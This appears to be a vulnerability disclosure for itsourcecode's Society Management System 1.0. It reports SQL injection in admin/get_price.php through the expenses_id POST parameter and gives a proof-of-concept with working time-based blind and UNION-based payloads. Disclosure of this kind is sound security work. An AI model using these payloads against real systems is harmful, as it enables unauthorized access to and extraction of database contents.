# Vendor

itsourcecode

# Product

Society Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/04/Society-Management-System-Project-In-PHP-Free-Download-Source-Code.zip

# Description

In the admin/get_price.php page, there is a SQL injection vulnerability. An attacker can inject SQL statements through the expenses_id parameter.
<img width="1100" alt="image" src="https://github.com/user-attachments/assets/e4036a97-6b27-46fa-881e-225225384be0">


# Poc

```
Parameter: expenses_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: expenses_id=1' AND (SELECT 2866 FROM (SELECT(SLEEP(5)))fobU) AND 'jWHt'='jWHt

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: expenses_id=1' UNION ALL SELECT NULL,CONCAT(0x717a716a71,0x546849444147574a76497952446555796b4952674c65737452485a514b55576d646a48435665566d,0x71786a7871),NULL,NULL,NULL,NULL-- -
```
<img width="1503" alt="image" src="https://github.com/user-attachments/assets/c426fa69-b11b-4512-a654-4cfd219eb758">
